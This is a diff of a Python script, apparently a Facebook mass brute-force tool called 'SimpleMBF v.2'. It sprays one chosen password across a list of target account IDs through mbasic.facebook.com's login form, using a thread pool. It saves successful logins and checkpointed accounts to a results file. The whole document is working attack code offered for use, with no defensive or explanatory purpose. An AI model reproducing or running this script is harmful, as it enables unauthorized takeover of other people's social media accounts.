@@ -1,77 +1,74 @@
-from threading import Thread
-from requests import post
-import os, urllib.parse, sys
+from multiprocessing.pool import ThreadPool
+import urllib.parse, os, requests
 os.system('clear')
-
-lie=[]
-chr=[]
-thr=[]
 #color
 r="\033[31m"
 g="\033[32m"
 w="\033[1;37m"
 c="\033[36m"
+y="\033[33m"
 #banner
 print("""%s
    _____            __    __  ______  ____
   / __(_)_ _  ___  / /__ /  |/  / _ )/ __/
- _\ \/ /  ' \/ _ \/ / -_) /|_/ / _  / _/  
-/___/_/_/_/_/ .__/_/\__/_/  /_/____/_/    
-           /_/ %sAuthor:KANG-NEWBIE%s
-"""%(c,g,w))
-def main(args,kwds):
+ _\ \/ /  ' \/ _ \/ / -_) /|_/ / _  / _/
+/___/_/_/_/_/ .__/_/\__/_/  /_/____/_/ %sv.2%s
+           /_/ 		%sAuthor:KANG-NEWBIE%s
+"""%(c,y,c,g,w))
+lie=[]
+def main(arg):
 	try:
-		url='https://mbasic.facebook.com/login.php'
-		dt={'email':args,'pass':kwds,'login':'submit'}
-		#req=post('https://mbasic.facebook.com/login.php',data=dt,headers={'User-Agent':'Mozilla/5.0 (Linux; Android 5.1.1; Andromax C46B2H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.156 Mobile Safari/537.36'}).url
-		data = urllib.parse.urlencode(dt)
-		data = data.encode('utf-8')
-		req = urllib.request.Request(url, data)
-		resp = urllib.request.urlopen(req)
-		respData = resp.read()
-		if 'save-device' in str(respData) or 'm_sess' in str(respData):
-			true='yeah'
-			live="[live] %s => %s"%(args,kwds)
-			lie.append(true)
-			try:
-				os.mkdir('result')
-			except FileExistsError:
-				pass
-			tulis="{}\n".format(live)
-			open('result/live.txt','a').write(tulis)
-			print("%s[%slive%s]%s %s -> %s"%(c,g,c,w,args,kwds))
-		else:
-			print("%s[%snot%s]%s %s"%(c,r,c,w,args))
-	except: pass
+                url='https://mbasic.facebook.com/login.php'
+                dt={'email':arg,'pass':pas,'login':'submit'}
+                req=requests.post(url,data=dt)
+#                data = urllib.parse.urlencode(dt)
+#                data = data.encode('utf-8')
+#                req = urllib.request.Request(url, data)
+#                resp = urllib.request.urlopen(req)
+                respData = req.content
+                if 'save-device' in str(respData) or 'm_sess' in str(respData):
+                        true='yeah'
+                        live="[found] %s => %s"%(arg,pas)
+                        lie.append(true)
+                        try:
+                                os.mkdir('result')
+                        except FileExistsError:
+                                pass
+                        tulis="{}\n".format(live)
+                        open('result/live.txt','a').write(tulis)
+                        print("%s[%sfound%s]%s %s -> %s"%(c,g,c,w,arg,pas))
+                elif 'checkpoint' in str(respData):
+                        true='notbad'
+                        lie.append(true)
+                        CP="[checkpoint] %s => %s"%(arg,pas)
+                        try:
+                                os.mkdir('result')
+                        except FileExistsError:
+                                pass
+                        wrt="{}\n".format(CP)
+                        open('result/live.txt','a').write(wrt)
+                        print("%s[%sCpoint%s]%s %s -> %s"%(c,y,c,w,arg,pas))
+                else:
+                        print("%s[%snot%s]%s %s"%(c,r,c,w,arg))
+	except:
+		pass
 
 try:
-	file=open(input("[in] Id List Target: ")).read().splitlines()
-	pas=input("[in] Password to Crack: ")
-	print()
+        file=open(input("[in] Id List Target: ")).read().splitlines()
+        pas=input("[in] Password to Crack: ")
 except KeyboardInterrupt:
-	exit("%s\n[!] Key interrupt: Exiting."%(r))
+        exit("%s\n[!] Key interrupt: Exiting."%(r))
 except EOFError:
-	exit("%s\n[!] Key interrupt: Exiting."%(r))
+        exit("%s\n[!] Key interrupt: Exiting."%(r))
 except FileNotFoundError:
-	exit("%s\n[!] File not found: Exiting."%(r))
+        exit("%s\n[!] File not found: Exiting."%(r))
+print("\n%s[LIVE RESULT]:"%(c))
 
-try:
-	for x in file:
-	    chr.append(x)
+o=[]
+for x in file:
+    o.append(x)
+p=ThreadPool(5)
+p.map(main,o)
 
-	for x in chr:
-	    t=Thread(target=main,args=(x,pas,))
-	    thr.append(t)
-
-	for t in thr:
-	    t.start()
-	for t in thr:
-	    t.join()
-except KeyboardInterrupt:
-	exit()
-except EOFError:
-	exit()
-
-if 'yeah' in str(lie):
-	print("\nLive Results saved: result/live.txt")
-
+if 'yeah' in str(lie) or 'notbad' in str(lie):
+        print("\nLive Results saved: result/live.txt")
